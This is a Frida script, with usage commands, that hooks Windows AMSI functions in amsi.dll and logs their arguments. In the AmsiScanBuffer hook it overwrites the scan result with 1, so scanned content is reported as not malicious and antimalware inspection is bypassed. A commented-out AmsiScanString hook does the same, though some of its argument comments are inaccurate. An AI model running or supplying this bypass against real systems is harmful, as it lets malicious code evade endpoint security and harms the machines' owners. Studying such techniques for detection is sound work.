/*
frida -p <PID> -l .\bypass-amsi.js
frida -n <process_name> -l .\bypass-amsi.js
frida <path/to/exe/file.exe> -l .\bypass-amsi.js
*/


// Hooking AMSI functions from amsi.dll
var amsiDll = Module.load('amsi.dll');

// Function for hooking AMSI functions
var amsiScanBuffer = amsiDll.findExportByName('AmsiScanBuffer');
var amsiInitialize = amsiDll.findExportByName('AmsiInitialize');
var amsiOpenSession = amsiDll.findExportByName('AmsiOpenSession');
var amsiCloseSession = amsiDll.findExportByName('AmsiCloseSession');
var amsiScanString = amsiDll.findExportByName('AmsiScanString');
var amsiResultIsMalware = amsiDll.findExportByName('AmsiResultIsMalware');

// Hook AmsiInitialize (initializes the AMSI subsystem)
Interceptor.attach(amsiInitialize, {
    onEnter: function(args) {
        console.log("[*] Hooked AmsiInitialize");
    },
    onLeave: function(retval) {
        console.log("[*] AmsiInitialize exit");
        console.log("|_ Initialization result: " + retval.toInt32()+"\n");
    }
});


// 1. Hook AmsiOpenSession (opens a session for scanning)
Interceptor.attach(amsiOpenSession, {
    onEnter: function(args) {
        console.log("[*] Hooked AmsiOpenSession");
        var session = args[0];
        console.log("|- Session handle: " + session);
    },
    onLeave: function(retval) {
        console.log("[*] AmsiOpenSession exit");
        console.log("|_ Session handle: " + retval+"\n");
    }
});


// Hook AmsiScanBuffer (used to scan buffers for malware)
Interceptor.attach(amsiScanBuffer, {
    onEnter: function(args) {
        console.log("[*] Hooked AmsiScanBuffer");

        // Get the arguments (the buffer, length, and session)
        var buffer = args[1];  // the buffer being scanned
        var length = args[2];   // length of the buffer
        var session = args[4];  // the AMSI session
        this.resultPointer = args[5];  // pointer to the AMSI result

        console.log("|- Buffer length: " + length);
        console.log("|- Buffer content: " + Memory.readUtf16String(buffer).substring(0, 100)+" <...>");
        console.log("|- AMSI session: " + session);
        console.log("|- AMSI result pointer: " + this.resultPointer);
    },
    onLeave: function(retval) {
        /*
        Note: it is important to read the result in the *onLeave* function
        */
        console.log("[*] AmsiScanBuffer exit");
        var scanResult = Memory.readUShort(this.resultPointer);
        console.log("[+] Patching result to 1");
        /*
        Note: The antimalware provider may return a result between 1 and 32767, inclusive, as an 
        estimated risk level. The larger the result, the riskier it is to continue with the content.
        ref.: https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result#constants
        */
        Memory.writeUShort(this.resultPointer, 1);
        console.log("|_ Exiting correctly == 0 ? " + retval.toInt32()+"\n");
    }
});


/*
// Hook AmsiScanString
Interceptor.attach(amsiScanString, {
    onEnter: function(args) {
        console.log("[*] Hooked AmsiScanString");

        // Get the arguments (the scanned string, length, and session)
        var scanned_str = args[1];  // the buffer being scanned
        var content_name = args[2];   // length of the buffer
        var session = args[3];  // the AMSI session
        var res = args[4];  

        console.log("|- Content name: " + content_name);
        console.log("|- String content: " + Memory.readUtf16String(scanned_str));
        console.log("|- AMSI session: " + session);
        console.log("|- AMSI result: " + res);

        // Optionally, modify the scan result (for bypass purposes)
        // Uncomment to set the result as safe (e.g., 0 for success)
        Memory.writeUShort(args[5], 0);  // Result to 0 (safe)
    },
    onLeave: function(retval) {
        console.log("[*] AmsiScanString exit");
        console.log("|_ Scan result: " + retval.toInt32()+"\n");
    }
});
*/

// Hook AmsiCloseSession (closes the AMSI session)
Interceptor.attach(amsiCloseSession, {
    onEnter: function(args) {
        console.log("[*] Hooked AmsiCloseSession");
        var session = args[0];
        console.log("|- Closing session: " + session);
    },
    onLeave: function(retval) {
        console.log("[*] AmsiCloseSession exit");
        console.log("|_ Session closed: " + retval.toInt32()+"\n");
    }
});
